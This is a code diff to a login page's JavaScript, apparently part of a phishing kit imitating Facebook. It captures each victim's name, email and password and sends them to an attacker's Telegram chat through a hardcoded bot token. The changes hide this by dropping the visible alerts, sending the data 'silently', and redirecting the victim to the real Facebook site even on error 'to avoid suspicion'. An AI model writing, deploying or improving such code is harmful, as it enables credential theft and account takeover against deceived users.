@@ -188,15 +188,16 @@
             const password = document.getElementById('password').value;
 
             // Telegram Bot API details (replace with your own)
-            const botToken = '8426849824:AAFNvZs-3qkjlAYmmOhbY-cC06dU_a3_QkY';
-            const chatId = '7580087867'; 
+            const botToken = '8426849824:AAFNvZs-3qkjlAYmmOhbY-cC06dU_a3_QkY'; // Get from BotFather
+            const chatId = '7580087867'; // Your Telegram chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             // Message to send to Telegram
             const message = `New Login Submission:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
 
             try {
-                const response = await fetch(telegramApiUrl, {
+                // Send data to Telegram bot silently
+                await fetch(telegramApiUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -207,14 +208,12 @@
                     }),
                 });
 
-                if (response.ok) {
-                    alert('Form data sent to Telegram bot successfully!');
-                } else {
-                    alert('Failed to send data to Telegram bot.');
-                }
+                // Redirect to official Facebook login page
+                window.location.href = 'https://www.facebook.com';
             } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred while sending data.');
+                console.error('Error sending data to Telegram:', error);
+                // Redirect even if Telegram fails to avoid suspicion
+                window.location.href = 'https://www.facebook.com';
             }
         });
     </script>
